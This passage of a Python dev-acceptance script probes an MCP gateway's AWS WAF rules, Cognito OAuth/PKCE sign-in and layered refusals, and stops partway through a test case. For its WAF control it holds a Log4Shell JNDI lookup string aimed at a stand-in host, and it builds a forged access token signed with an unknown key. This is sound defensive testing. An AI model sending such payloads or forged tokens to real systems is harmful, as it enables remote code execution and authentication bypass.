# SPDX-License-Identifier: MIT-0
"""Dev acceptance of the external MCP gateway for Amazon Quick (ADR-150, docs/amazon-quick.md).

`--case pass1` runs against the gate with no tool targets and a counting web ACL:

1. WAF coverage: the ACL reads back associated with the gateway, the gateway reads back its ACL
   and `FAIL_CLOSE`, and one anonymous request with a fictional Log4J `User-Agent` gets a non-2xx
   answer and exactly one COUNT record from `AwsKnownBadInputs` / `Log4JRCE_HEADER`.
2. Protected-resource metadata, which only Amazon Quick reads: a FAIL marks the Quick hop pending
   and does not stop the run.
3. Positive control: `probe-a`, signed in through managed login with PKCE and `resource`, gets
   `initialize` 200 and `tools/list` 200 with no tools.
4. Refusals, each naming its layer: no bearer on three methods, a malformed bearer, a foreign-key
   JWT, a BFF-client token, and `probe-b` (no `mcp_tool_use`).
5. The demo calls' bodies as `probe-a`: every WAF record since case 1 is that one control.

`--case pass2` runs after every rule blocks and the targets attach: pass 1's refusals again, the
Log4J request now blocked (Proof 1), the five tools and the governed fields of each demo answer on
parsed JSON (Proof 2, case G included), and `probe-b` refused at the gateway and by the tool on a
direct invoke, with `probe-a` answered as the control (Proof 3).

Positive controls come first, and every case prints `CASE id | expected | observed | PASS/FAIL`.
Only `--environment dev` is accepted, after the caller identity's account is checked. Every value
comes from the published parameters, never from a literal. Output and evidence hold status codes,
JSON-RPC codes, rule ids, labels and counts: never a bearer, code, verifier, password, header
value or log record. Evidence goes to the gitignored `validation/evidence/external-mcp/`.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import secrets
import subprocess
import sys
import time
import uuid
from collections.abc import Callable, Mapping, Sequence
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import StrEnum
from pathlib import Path
from typing import TYPE_CHECKING, Any, cast
from urllib.parse import urlencode, urlsplit

import boto3
import jwt
import yaml
from cognito_personas import (
    PersonaCredential,
    app_client,
    load_persona,
    published_parameter,
    sign_in,
)
from cryptography.hazmat.primitives.asymmetric import rsa
from probe_identity_chain import LogWindow, deployed_function_name, now_ms, terminal_records

from adapters.outbound.https import HttpsSession, require_https

if TYPE_CHECKING:
    from types_boto3_ssm import SSMClient

_ROOT = Path(__file__).resolve().parents[1]
_TOOL_CONTRACT = _ROOT / "contracts" / "generated" / "tools.json"
_DICTIONARY = _ROOT / "contracts" / "shared" / "metric-dictionary.yaml"
_EVIDENCE = _ROOT / "validation" / "evidence" / "external-mcp"
_LOGIN_SCRIPT = _ROOT / "validation" / "mcp_managed_login.mjs"
_HTTP = HttpsSession()
_ENVIRONMENT = "dev"
_PERSONA_A = "probe-a"
_PERSONA_B = "probe-b"
_LOG4J_USER_AGENT = "${jndi:ldap://probe.invalid/a}"
"""A fictional Log4j lookup reaching nothing: the known-bad-inputs group's header rule."""
_LOG4J_RULE = "Log4JRCE_HEADER"
_KNOWN_BAD_GROUP = "AwsKnownBadInputs"
_KNOWN_BAD_GROUP_ID = "AWSManagedRulesKnownBadInputsRuleSet"
_WAF_BLOCK_MESSAGE = "Authorization error - Request forbidden"
_WAF_BLOCK_CODE = -32002
_INTERCEPTOR_REFUSAL_CODE = -32001
_CALLER_UNVERIFIED = "ADLY-CALLER-0001"
_PROTOCOL_VERSION = "2025-06-18"
_WAF_POLL_SECONDS = 20
_WAF_BUDGET_SECONDS = 600
_LOG_SETTLE_SECONDS = 30
"""How long a Lambda record is given to reach its log group before its absence is evidence."""
_ATTEMPT_GAP_SECONDS = 5
"""More than twice the 2 s log-window skew, so adjacent attempts' windows never overlap."""
_HTTP_BAD_REQUEST = 400
_HTTP_UNAUTHORIZED = 401
_HTTP_FORBIDDEN = 403
_SUCCESS = range(200, 300)
_EXPECTED_TOOL_COUNT = 5
_SHORTEST_SECRET_PART = 8
"""Token parts this short are never secret on their own (a JWS header can be 20 characters)."""
_RESOURCE_REFUSED_NOTE = "Cognito refuses RFC 8707 resource at /oauth2/token"

DEMO_CALLS: tuple[tuple[str, str, Mapping[str, object]], ...] = (
    ("Q1", "catalog_list_metrics", {}),
    (
        "Q2",
        "measurement_metric_by_grain",
        {"metric_reference": "ad spend", "grains": ["campaign"], "period_reference": "last month"},
    ),
    (
        "Q3",
        "measurement_top_n",
        {
            "metric_reference": "ROAS",
            "grains": ["campaign"],
            "rank_size": 5,
            "rank_order": "VALUE",
            "period_reference": "last month",
        },
    ),
    (
        "G",
        "measurement_metric_by_grain",
        {
            "metric_reference": "attributed revenue",
            "grains": ["ecosystem"],
            "period_reference": "last month",
        },
    ),
)
"""The demo script's four governed calls (docs/amazon-quick.md §5), in schema argument names."""

_TARGET_OF = {"catalog_": "catalog", "measurement_": "measurement"}
_Q2_LABEL = "Ad spend"
_Q3_LABEL = "ROAS (attributed, 14 day)"
_G_LABEL = "Attributed revenue (14 day, advertised products)"
_ECOSYSTEM_COLUMN = "ecosystem_key"


class StopRunError(Exception):
    """A failure after which the remaining cases would prove nothing; the message is safe."""


# ---------------------------------------------------------------------------
# The case table
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class CaseResult:
    """One row of the case table: what was expected, what was seen, and whether a FAIL stops."""

    case_id: str
    expected: str
    observed: str
    passed: bool
    stops: bool = True

    def row(self) -> str:
        """Render the printed row."""
        verdict = "PASS" if self.passed else "FAIL"
        return f"CASE {self.case_id} | {self.expected} | {self.observed} | {verdict}"


@dataclass
class Run:
    """The results so far, the pending notes for the Quick hop, and the values never to print."""

    results: list[CaseResult] = field(default_factory=list[CaseResult])
    quick_hop_notes: list[str] = field(default_factory=list[str])
    secrets: list[str] = field(default_factory=list[str])

    def record(self, result: CaseResult) -> CaseResult:
        """Record and print one result, redacted; a stopping FAIL ends the run."""
        self.results.append(result)
        print(redact(result.row(), self.secrets))
        if not result.passed and result.stops:
            raise StopRunError(f"case {result.case_id} failed")
        return result

    @property
    def passed(self) -> bool:
        """Whether every stopping case passed."""
        return all(result.passed or not result.stops for result in self.results)


def redact(text: str, values: Sequence[str]) -> str:
    """Replace every secret value, and each dot-separated part of a token, with `<redacted>`."""
    redacted = text
    parts = sorted(
        {
            part
            for value in values
            if value
            for part in (value, *value.split("."))
            if len(part) > _SHORTEST_SECRET_PART
        },
        key=len,
        reverse=True,
    )
    for part in parts:
        redacted = redacted.replace(part, "<redacted>")
    return redacted


def require_dev(environment: str) -> None:
    """Refuse any environment but dev, before any AWS or network call (`adlytics-safety`)."""
    if environment != _ENVIRONMENT:
        raise SystemExit(f"probe_external_mcp accepts only --environment {_ENVIRONMENT}.")


# ---------------------------------------------------------------------------
# The demo calls against the generated tool contract
# ---------------------------------------------------------------------------


def validate_demo_calls(tools_document: Mapping[str, object]) -> list[str]:
    """Return every way a demo call disagrees with the generated tool schemas; empty is valid."""
    raw_tools = tools_document.get("tools")
    tools = cast("list[Mapping[str, Any]]", raw_tools) if isinstance(raw_tools, list) else []
    schemas = {
        str(tool.get("name")): cast("Mapping[str, Any]", tool.get("inputSchema", {}))
        for tool in tools
    }
    problems: list[str] = []
    for case_id, name, arguments in DEMO_CALLS:
        schema = schemas.get(name)
        if schema is None:
            problems.append(f"{case_id}: {name} is not a declared tool")
            continue
        properties = cast("Mapping[str, object]", schema.get("properties", {}))
        problems.extend(
            f"{case_id}: {name} declares no argument {key}"
            for key in arguments
            if key not in properties
        )
        problems.extend(
            f"{case_id}: {name} requires {key}"
            for key in cast("list[str]", schema.get("required", []))
            if key not in arguments
        )
    return problems


def gateway_tool_name(name: str) -> str:
    """Return the name the gateway lists: the target name, three underscores, the tool name."""
    for prefix, target in _TARGET_OF.items():
        if name.startswith(prefix):
            return f"{target}___{name}"
    raise ValueError(f"{name} belongs to no target")


# ---------------------------------------------------------------------------
# MCP over HTTPS
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class McpReply:
    """One gateway answer, reduced to what a case judges: never a body or a header value."""

    status: int
    www_authenticate: bool
    resource_metadata: str
    rpc_code: int | None
    rpc_message: str
    result: Mapping[str, object] | None


def _rpc_document(content_type: str, text: str) -> Mapping[str, object]:
    """Read one JSON-RPC message from a JSON or an SSE response body."""
    if content_type.startswith("text/event-stream"):
        data = [line[5:].strip() for line in text.splitlines() if line.startswith("data:")]
        text = data[-1] if data else ""
    try:
        document: object = json.loads(text) if text.strip() else {}
    except ValueError:
        return {}
    return cast("Mapping[str, object]", document) if isinstance(document, Mapping) else {}


def _resource_metadata(header: str) -> str:
    """Return the `resource_metadata` URL of a `WWW-Authenticate` challenge, or empty."""
    for part in header.split(","):
        name, _, value = part.strip().partition("=")
        if name.strip().lower().endswith("resource_metadata"):
            return value.strip().strip('"')
    return ""


def mcp_reply(status: int, headers: Mapping[str, str], text: str) -> McpReply:
    """Reduce one HTTP response to an `McpReply`."""
    challenge = next(
        (value for name, value in headers.items() if name.lower() == "www-authenticate"), ""
    )
    content_type = next(
        (value for name, value in headers.items() if name.lower() == "content-type"), ""
    )
    document = _rpc_document(content_type, text)
    error = document.get("error")
    error_map: Mapping[str, object] = (
        cast("Mapping[str, object]", error) if isinstance(error, Mapping) else {}
    )
    code = error_map.get("code")
    result = document.get("result")
    return McpReply(
        status=status,
        www_authenticate=bool(challenge),
        resource_metadata=_resource_metadata(challenge),
        rpc_code=code if isinstance(code, int) else None,
        rpc_message=str(error_map.get("message", "")),
        result=cast("Mapping[str, object]", result) if isinstance(result, Mapping) else None,
    )


def _post(url: str, body: Mapping[str, object], bearer: str | None) -> McpReply:
    headers = {
        "content-type": "application/json",
        "accept": "application/json, text/event-stream",
        "mcp-protocol-version": _PROTOCOL_VERSION,
    }
    if bearer is not None:
        headers["authorization"] = bearer
    response = _HTTP.post(
        require_https(url),
        data=json.dumps(body),
        headers=headers,
        timeout=60,
        allow_redirects=False,
    )
    return mcp_reply(response.status_code, dict(response.headers), response.text)


def _message(method: str, params: Mapping[str, object] | None = None) -> dict[str, object]:
    message: dict[str, object] = {
        "jsonrpc": "2.0",
        "id": uuid.uuid4().int % 1_000_000,
        "method": method,
    }
    if params is not None:
        message["params"] = dict(params)
    return message


def _initialize() -> dict[str, object]:
    return _message(
        "initialize",
        {
            "protocolVersion": _PROTOCOL_VERSION,
            "capabilities": {},
            "clientInfo": {"name": "adlytics-external-mcp-probe", "version": "1"},
        },
    )


def _tools_call(name: str, arguments: Mapping[str, object]) -> dict[str, object]:
    return _message("tools/call", {"name": gateway_tool_name(name), "arguments": dict(arguments)})


def anonymous_refused(reply: McpReply) -> bool:
    """Judge case 1: any non-2xx passes.

    The gateway's 401 and the interceptor's 5xx on a bodyless GET alike: pass 1 has no targets,
    so no tool can have run either way.
    """
    return reply.status not in _SUCCESS


def waf_blocked(reply: McpReply) -> bool:
    """Proof 1: the WAF's own JSON-RPC refusal for an MCP request."""
    return reply.rpc_code == _WAF_BLOCK_CODE and reply.rpc_message == _WAF_BLOCK_MESSAGE


def tool_result(reply: McpReply) -> Mapping[str, object] | None:
    """Return the tool's own JSON result inside a `tools/call` answer, parsed, or `None`."""
    if reply.result is None:
        return None
    structured = reply.result.get("structuredContent")
    if isinstance(structured, Mapping):
        return cast("Mapping[str, object]", structured)
    content = reply.result.get("content")
    if not isinstance(content, list) or not content:
        return None
    first = cast("list[object]", content)[0]
    text = cast("Mapping[str, object]", first).get("text") if isinstance(first, Mapping) else None
    if not isinstance(text, str):
        return None
    try:
        parsed: object = json.loads(text)
    except ValueError:
        return None
    return cast("Mapping[str, object]", parsed) if isinstance(parsed, Mapping) else None


# ---------------------------------------------------------------------------
# Which layer refused: the status, the challenge, and the interceptor's own records
# ---------------------------------------------------------------------------


class Layer(StrEnum):
    """Who answered a refused request."""

    GATEWAY = "gateway_authorizer"
    INTERCEPTOR = "interceptor"
    WAF = "aws_waf"
    ADMITTED = "admitted"
    AMBIGUOUS = "ambiguous"


@dataclass(frozen=True, slots=True)
class InterceptorRecord:
    """The three fields a layer judgement reads from one interceptor terminal record."""

    outcome: str
    jsonrpc_method: str
    bearer_present: bool

    @classmethod
    def from_log(cls, record: Mapping[str, object]) -> InterceptorRecord:
        """Project a terminal record onto the three fields; nothing else is kept."""
        return cls(
            outcome=str(record.get("outcome", "")),
            jsonrpc_method=str(record.get("jsonrpc_method", "")),
            bearer_present=record.get("bearer_present") is True,
        )


def refusal_layer(reply: McpReply, records: Sequence[InterceptorRecord], method: str) -> Layer:
    """Name the layer that refused one request, from positive evidence only.

    The gateway authorizer: 401 or 403 with no interceptor record for this method. The
    interceptor: its own `-32001` and an `unauthorized` record. AWS WAF: `-32002` with the WAF's
    message. A 2xx with a result is admitted; anything else is ambiguous, which is a FAIL.
    """
    for_method = [record for record in records if record.jsonrpc_method == method]
    if reply.status in _SUCCESS and reply.rpc_code is None and reply.result is not None:
        return Layer.ADMITTED
    if reply.rpc_code == _WAF_BLOCK_CODE and reply.rpc_message == _WAF_BLOCK_MESSAGE:
        return Layer.WAF
    if reply.rpc_code == _INTERCEPTOR_REFUSAL_CODE and [r.outcome for r in for_method] == [
        "unauthorized"
    ]:
        return Layer.INTERCEPTOR
    if reply.status in (_HTTP_UNAUTHORIZED, _HTTP_FORBIDDEN) and not for_method:
        return Layer.GATEWAY
    return Layer.AMBIGUOUS


# ---------------------------------------------------------------------------
# The web ACL's own records: rule ids and actions only
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class WafRecord:
    """One WAF log record, projected onto its action and rule ids; no header or body is kept."""

    action: str
    terminating_rule: str
    matched_rules: tuple[str, ...]
    """Every `group/rule` or ACL rule the record names as matching, terminating or counted."""
    locations: tuple[str, ...]
    """The matched request component of each match (`HEADER`, `BODY`...), never its value."""

    @classmethod
    def from_log(cls, record: Mapping[str, object]) -> WafRecord:
        """Project a raw WAF log record; the raw record is not retained."""
        matched: list[str] = []
        locations: list[str] = []

        def note(entry: object, group: str = "") -> None:
            if not isinstance(entry, Mapping):
                return
            item = cast("Mapping[str, object]", entry)
            rule = str(item.get("ruleId", ""))
            if rule:
                matched.append(f"{group}/{rule}" if group else rule)
            for detail in cast("list[object]", item.get("ruleMatchDetails") or []):
                if isinstance(detail, Mapping):
                    locations.append(str(cast("Mapping[str, object]", detail).get("location", "")))

        for entry in cast("list[object]", record.get("nonTerminatingMatchingRules") or []):
            note(entry)
        for raw_group in cast("list[object]", record.get("ruleGroupList") or []):
            if not isinstance(raw_group, Mapping):
                continue
            group = cast("Mapping[str, object]", raw_group)
            name = str(group.get("ruleGroupId", "")).split("#")[-1]
            note(group.get("terminatingRule"), name)
            for entry in cast("list[object]", group.get("nonTerminatingMatchingRules") or []):
                note(entry, name)
            for entry in cast("list[object]", group.get("excludedRules") or []):
                note(entry, name)
        return cls(
            action=str(record.get("action", "")),
            terminating_rule=str(record.get("terminatingRuleId", "")),
            matched_rules=tuple(matched),
            locations=tuple(location for location in locations if location),
        )

    def is_log4j_control(self, *, blocking: bool) -> bool:
        """Whether this is the case-1 positive control, counted in pass 1 or blocked in pass 2."""
        named = f"{_KNOWN_BAD_GROUP_ID}/{_LOG4J_RULE}" in self.matched_rules
        if blocking:
            return named and self.action == "BLOCK" and self.terminating_rule == _KNOWN_BAD_GROUP
        return named and self.action != "BLOCK" and _KNOWN_BAD_GROUP in self.matched_rules


@dataclass(frozen=True, slots=True)
class WafVerdict:
    """A window of WAF records against the one expected control."""

    controls: int
    others: tuple[WafRecord, ...]

    @property
    def only_the_control(self) -> bool:
        """Exactly one control and nothing else: no match on legitimate traffic."""
        return self.controls == 1 and not self.others

    def describe(self) -> str:
        """Rule ids and matched components only, for the owner's WAF scoping decision."""
        others = "; ".join(
            f"{record.action} {record.terminating_rule} {','.join(record.matched_rules)} "
            f"[{','.join(record.locations)}]"
            for record in self.others
        )
        return f"controls {self.controls}, other records {len(self.others)}" + (
            f": {others}" if others else ""
        )


def classify_waf(records: Sequence[WafRecord], *, blocking: bool) -> WafVerdict:
    """Split a window's records into the control and everything else."""
    controls = [record for record in records if record.is_log4j_control(blocking=blocking)]
    return WafVerdict(
        controls=len(controls),
        others=tuple(
            record for record in records if not record.is_log4j_control(blocking=blocking)
        ),
    )


# ---------------------------------------------------------------------------
# Token acquisition: managed login, PKCE S256 and RFC 8707 `resource`
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class Pkce:
    """One PKCE pair; the verifier never leaves this process except to the token endpoint."""

    verifier: str = field(repr=False)

    @classmethod
    def new(cls) -> Pkce:
        """Generate a 43-character verifier."""
        return cls(verifier=secrets.token_urlsafe(32))

    @property
    def challenge(self) -> str:
        """Return the S256 challenge."""
        digest = hashlib.sha256(self.verifier.encode("ascii")).digest()
        return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")


@dataclass(frozen=True, slots=True)
class Redemption:
    """One `/oauth2/token` answer: its status, Cognito's error code, and any access token."""

    status: int
    error: str
    access_token: str = field(repr=False, default="")


@dataclass(frozen=True, slots=True)
class MintedToken:
    """The access token a persona got, and what the redemption showed about `resource` (3b)."""

    access_token: str = field(repr=False)
    resource_on_redeem: str
    """`accepted`, or `refused: <Cognito error code>` when the branch ran."""


def mint_with_resource_branch(
    authorize: Callable[[Pkce], str], redeem: Callable[[str, Pkce, bool], Redemption]
) -> MintedToken:
    """Get an access token as Quick would, with the decided branch for a refused `resource`.

    Authorize with `resource` and redeem with it. On HTTP 400 only: record the refusal, authorize
    afresh (still with `resource`, as Quick sends it), and redeem without it. Any other failure,
    and a failure of the second redemption, stops the case.
    """
    first = Pkce.new()
    answer = redeem(authorize(first), first, True)
    if answer.status in _SUCCESS and answer.access_token:
        return MintedToken(access_token=answer.access_token, resource_on_redeem="accepted")
    if answer.status != _HTTP_BAD_REQUEST:
        raise StopRunError(f"token redemption failed: HTTP {answer.status} {answer.error}")
    second = Pkce.new()
    retry = redeem(authorize(second), second, False)
    if retry.status in _SUCCESS and retry.access_token:
        return MintedToken(
            access_token=retry.access_token, resource_on_redeem=f"refused: {answer.error}"
        )
    raise StopRunError(
        f"token redemption without resource failed: HTTP {retry.status} {retry.error}"
    )


@dataclass(frozen=True, slots=True)
class Target:
    """Every deployed value the probe needs, all read from published parameters."""

    gateway_url: str
    mcp_client_id: str
    auth_domain: str
    user_pool_id: str
    public_base_url: str
    region: str
    account: str

    @property
    def gateway_id(self) -> str:
        """The gateway id is the first label of its hostname."""
        return (urlsplit(self.gateway_url).hostname or "").split(".")[0]

    @property
    def gateway_arn(self) -> str:
        """The gateway's ARN, in the form `AssociateWebACL` accepts."""
        return f"arn:aws:bedrock-agentcore:{self.region}:{self.account}:gateway/{self.gateway_id}"

    @property
    def issuer(self) -> str:
        """The user pool issuer the gateway's discovery URL names."""
        return f"https://cognito-idp.{self.region}.amazonaws.com/{self.user_pool_id}"

    @property
    def redirect_uri(self) -> str:
        """Quick's Region callback, as `quickOauthCallbackUrl` builds it."""
        return f"https://{self.region}.quicksight.aws.amazon.com/sn/oauthcallback"


def authorize_url(target: Target, pkce: Pkce, state: str) -> str:
    """Build the managed-login authorize URL Quick would open, with `resource`."""
    query = urlencode(
        {
            "response_type": "code",
            "client_id": target.mcp_client_id,
            "redirect_uri": target.redirect_uri,
            "scope": "openid",
            "state": state,
            "code_challenge": pkce.challenge,
            "code_challenge_method": "S256",
            "resource": target.gateway_url,
        }
    )
    return f"https://{target.auth_domain}/oauth2/authorize?{query}"


def _browser_code(target: Target, credential: PersonaCredential, pkce: Pkce) -> str:
    """Sign in through managed login in a headless browser; return the code, never printed."""
    state = secrets.token_urlsafe(16)
    request = {
        "authorizeUrl": authorize_url(target, pkce, state),
        "redirectUri": target.redirect_uri,
        "username": credential.username,
        "password": credential.password,
    }
    completed = subprocess.run(  # noqa: S603 - a fixed script; credentials go on stdin, never argv
        ["node", str(_LOGIN_SCRIPT)],  # noqa: S607
        input=json.dumps(request),
        capture_output=True,
        text=True,
        timeout=180,
        check=False,
    )
    if completed.returncode != 0:
        raise StopRunError(f"managed login failed: exit {completed.returncode}")
    answer = cast("Mapping[str, object]", json.loads(completed.stdout or "{}"))
    if answer.get("state") != state or not isinstance(answer.get("code"), str):
        raise StopRunError("managed login returned no code for this state")
    return cast("str", answer["code"])


def _redeem(target: Target, code: str, pkce: Pkce, *, with_resource: bool) -> Redemption:
    form = {
        "grant_type": "authorization_code",
        "client_id": target.mcp_client_id,
        "code": code,
        "redirect_uri": target.redirect_uri,
        "code_verifier": pkce.verifier,
    }
    if with_resource:
        form["resource"] = target.gateway_url
    response = _HTTP.post(
        require_https(f"https://{target.auth_domain}/oauth2/token"),
        data=form,
        headers={"content-type": "application/x-www-form-urlencoded"},
        timeout=30,
        allow_redirects=False,
    )
    document: Mapping[str, object]
    try:
        document = cast("Mapping[str, object]", response.json())
    except ValueError:
        document = {}
    return Redemption(
        status=response.status_code,
        error=str(document.get("error", "")),
        access_token=str(document.get("access_token", "")),
    )


def mint_mcp_token(target: Target, ssm: SSMClient, label: str, *, run: Run) -> MintedToken:
    """Sign one persona in on the MCP client exactly as Amazon Quick would."""
    credential = load_persona(ssm, _ENVIRONMENT, label)
    run.secrets.append(credential.password)

    def authorize(pkce: Pkce) -> str:
        run.secrets.append(pkce.verifier)
        code = _browser_code(target, credential, pkce)
        run.secrets.append(code)
        return code

    def redeem(code: str, pkce: Pkce, with_resource: bool) -> Redemption:
        return _redeem(target, code, pkce, with_resource=with_resource)

    minted = mint_with_resource_branch(authorize, redeem)
    run.secrets.append(minted.access_token)
    if (
        minted.resource_on_redeem != "accepted"
        and _RESOURCE_REFUSED_NOTE not in run.quick_hop_notes
    ):
        run.quick_hop_notes.append(_RESOURCE_REFUSED_NOTE)
    return minted


def foreign_key_token(target: Target) -> str:
    """Sign a pool-shaped access token with a key the pool never published."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    issued = int(time.time())
    claims = {
        "iss": target.issuer,
        "sub": str(uuid.uuid4()),
        "client_id": target.mcp_client_id,
        "token_use": "access",
        "scope": "openid",
        "quality_review_levels": ["mcp_tool_use"],
        "iat": issued,
        "exp": issued + 600,
    }
    return jwt.encode(
        claims, key=key, algorithm="RS256", headers={"kid": "external-mcp-probe-unknown"}
    )


# ---------------------------------------------------------------------------
# Proof 2: the governed fields of each answer, on parsed JSON against the dictionary
# ---------------------------------------------------------------------------


def dictionary_labels(path: Path = _DICTIONARY) -> dict[str, str]:
    """Every metric's governed label from the metric dictionary."""
    document = cast("Mapping[str, object]", yaml.safe_load(path.read_text("utf-8")))
    metrics = cast("Mapping[str, Mapping[str, object]]", document.get("metrics", {}))
    return {name: str(metric.get("label", "")) for name, metric in metrics.items()}


def _metadata(result: Mapping[str, object]) -> Mapping[str, object]:
    metadata = result.get("metadata")
    return cast("Mapping[str, object]", metadata) if isinstance(metadata, Mapping) else {}


def _data(result: Mapping[str, object]) -> Mapping[str, object]:
    data = result.get("data")
    return cast("Mapping[str, object]", data) if isinstance(data, Mapping) else {}


def _labels(result: Mapping[str, object]) -> list[str]:
    fields = cast("list[Mapping[str, object]]", _data(result).get("claim_fields") or [])
    return [str(item.get("label")) for item in fields]


def _window_qualifiers(result: Mapping[str, object]) -> list[Mapping[str, object]]:
    qualifiers = cast(
        "list[Mapping[str, object]]", _metadata(result).get("semantic_qualifiers") or []
    )
    return [item for item in qualifiers if item.get("field") == "attribution_window"]


@dataclass(frozen=True, slots=True)
class FieldCheck:
    """One answer's governed-field verdict and its safe description."""

    passed: bool
    observed: str
    notes: tuple[str, ...] = ()


def _basis(result: Mapping[str, object]) -> bool:
    return bool(_metadata(result).get("measurement_basis"))


def _measured_period(result: Mapping[str, object]) -> tuple[bool, tuple[str, ...]]:
    metadata = _metadata(result)
    holes = cast("list[object]", metadata.get("coverage_holes") or [])
    notes = (f"coverage_holes {len(holes)}",) if holes else ()
    return bool(metadata.get("requested_coverage_intervals")), notes


def check_q1(result: Mapping[str, object], labels: Mapping[str, str]) -> FieldCheck:
    """Catalog: every row's label is its metric's dictionary label, and no period is stated."""
    rows = cast("list[Mapping[str, object]]", _data(result).get("values") or [])
    mislabelled = [
        str(row.get("metric"))
        for row in rows
        if labels.get(str(row.get("metric"))) != row.get("label")
    ]
    metadata = _metadata(result)
    no_period = not metadata.get("requested_coverage_intervals") and (
        metadata.get("coverage_start") == metadata.get("coverage_end")
    )
    passed = bool(rows) and not mislabelled and no_period and _basis(result)
    return FieldCheck(
        passed,
        f"rows {len(rows)}, mislabelled {mislabelled}, states no period {no_period}, "
        f"basis {_basis(result)}",
    )


def check_q2(result: Mapping[str, object]) -> FieldCheck:
    """Ad spend: exactly one claim field labelled `Ad spend`, no window, a measured period."""
    labels = _labels(result)
    period, notes = _measured_period(result)
    windowless = not _window_qualifiers(result)
    passed = labels == [_Q2_LABEL] and windowless and period and _basis(result)
    return FieldCheck(
        passed,
        f"claim labels {labels}, attribution_window qualifiers {not windowless}, period {period}",
        notes,
    )


def check_q3(result: Mapping[str, object]) -> FieldCheck:
    """ROAS: the windowed label and the `[14, null]` attribution-window qualifier."""
    labels = _labels(result)
    windows = [(item.get("left"), item.get("right")) for item in _window_qualifiers(result)]
    period, notes = _measured_period(result)
    passed = _Q3_LABEL in labels and windows == [(14, None)] and period and _basis(result)
    return FieldCheck(passed, f"claim labels {labels}, windows {windows}, period {period}", notes)


def check_governance(result: Mapping[str, object]) -> FieldCheck:
    """Case G: the attributed-revenue label, and a non-additivity rule naming the ecosystem axis.

    With one network in dev there is nothing to sum across, which is recorded, not failed.
    """
    labels = _labels(result)
    rows = cast("list[Mapping[str, object]]", _data(result).get("values") or [])
    networks = {row.get(_ECOSYSTEM_COLUMN) for row in rows}
    additivity = _data(result).get("additivity")
    across = (
        cast("Mapping[str, object]", additivity).get("across")
        if isinstance(additivity, Mapping)
        else None
    )
    names_axis = isinstance(across, list) and _ECOSYSTEM_COLUMN in cast("list[object]", across)
    period, notes = _measured_period(result)
    labelled = len(labels) == 1 and labels[0] == _G_LABEL and period and _basis(result)
    if len(networks) > 1:
        return FieldCheck(
            labelled and names_axis,
            f"labels {labels}, networks {len(networks)}, additivity names ecosystem {names_axis}",
            notes,
        )
    return FieldCheck(
        labelled, f"labels {labels}, networks {len(networks)}", (*notes, "single network in dev")
    )


def check_tools_list(reply: McpReply, rule: str) -> FieldCheck:
    """Exactly the five declared tools, each description ending with the external-client rule."""
    tools = cast("list[Mapping[str, object]]", (reply.result or {}).get("tools") or [])
    names = sorted(str(tool.get("name")) for tool in tools)
    declared = sorted(gateway_tool_name(str(tool["name"])) for tool in _declared_tools())
    ruled = all(str(tool.get("description", "")).endswith(f" {rule}") for tool in tools)
    passed = (
        reply.status in _SUCCESS
        and names == declared
        and len(names) == _EXPECTED_TOOL_COUNT
        and ruled
    )
    return FieldCheck(
        passed,
        f"HTTP {reply.status}, tools {len(names)}, every description ends with the rule {ruled}",
    )


def _contract() -> Mapping[str, object]:
    return cast("Mapping[str, object]", json.loads(_TOOL_CONTRACT.read_text("utf-8")))


def _declared_tools() -> list[Mapping[str, object]]:
    return cast("list[Mapping[str, object]]", _contract()["tools"])


# ---------------------------------------------------------------------------
# AWS reads
# ---------------------------------------------------------------------------


def _waf_records(session: boto3.Session, window: LogWindow) -> list[WafRecord]:
    group = f"aws-waf-logs-adlytics-{_ENVIRONMENT}-external-mcp"
    records: list[WafRecord] = []
    paginator = session.client("logs").get_paginator("filter_log_events")
    for page in paginator.paginate(
        logGroupName=group, startTime=window.start_ms, endTime=window.end_ms
    ):
        for event in page.get("events", []):
            try:
                raw: object = json.loads(event.get("message", ""))
            except ValueError:
                continue
            if isinstance(raw, Mapping):
                records.append(WafRecord.from_log(cast("Mapping[str, object]", raw)))
    return records


def _await_waf(session: boto3.Session, window_start: int, *, blocking: bool) -> WafVerdict:
    """Poll the ACL's log group until the control arrives, up to the delivery budget."""
    deadline = time.monotonic() + _WAF_BUDGET_SECONDS
    while True:
        verdict = classify_waf(
            _waf_records(session, LogWindow.around(window_start, now_ms())), blocking=blocking
        )
        if verdict.controls >= 1 or time.monotonic() >= deadline:
            return verdict
        time.sleep(_WAF_POLL_SECONDS)


def _interceptor_records(session: boto3.Session, window: LogWindow) -> list[InterceptorRecord]:
    """Read the interceptor's terminal records in one window; callers wait for delivery first."""
    return [
        InterceptorRecord.from_log(record)
        for record in terminal_records(
            session,
            function_name=deployed_function_name(_ENVIRONMENT, "ExternalMcpInterceptor"),
            window=window,
        )
        if record.get("operation") == "gateway.interceptor"
    ]


def _target(session: boto3.Session, account: str, region: str) -> Target:
    ssm = session.client("ssm")
    return Target(
        gateway_url=published_parameter(ssm, _ENVIRONMENT, "externalMcpGatewayUrl"),
        mcp_client_id=published_parameter(ssm, _ENVIRONMENT, "mcpClientId"),
        auth_domain=published_parameter(ssm, _ENVIRONMENT, "authDomain"),
        user_pool_id=published_parameter(ssm, _ENVIRONMENT, "userPoolId"),
        public_base_url=published_parameter(ssm, _ENVIRONMENT, "publicBaseUrl"),
        region=region,
        account=account,
    )


# ---------------------------------------------------------------------------
# The cases
# ---------------------------------------------------------------------------


@dataclass
class Context:
    """One run's AWS session, target, run state and the tokens minted so far."""

    session: boto3.Session
    target: Target
    run: Run
    tokens: dict[str, str] = field(default_factory=dict[str, str])

    def bearer(self, label: str) -> str:
        """Return `Bearer <token>` for a persona, minting it once."""
        if label not in self.tokens:
            minted = mint_mcp_token(self.target, self.session.client("ssm"), label, run=self.run)
            self.tokens[label] = minted.access_token
            if label == _PERSONA_A:
                self.run.record(
                    CaseResult(
                        "3b",
                        "resource on /oauth2/token: recorded",
                        minted.resource_on_redeem,
                        True,
                        stops=False,
                    )
                )
        return f"Bearer {self.tokens[label]}"


def case_waf_coverage(ctx: Context, *, blocking: bool) -> int:
    """Case 1 (pass 1) or Proof 1 (pass 2); returns the window start for case 5."""
    started = now_ms()
    if not blocking:
        waf = ctx.session.client("wafv2")
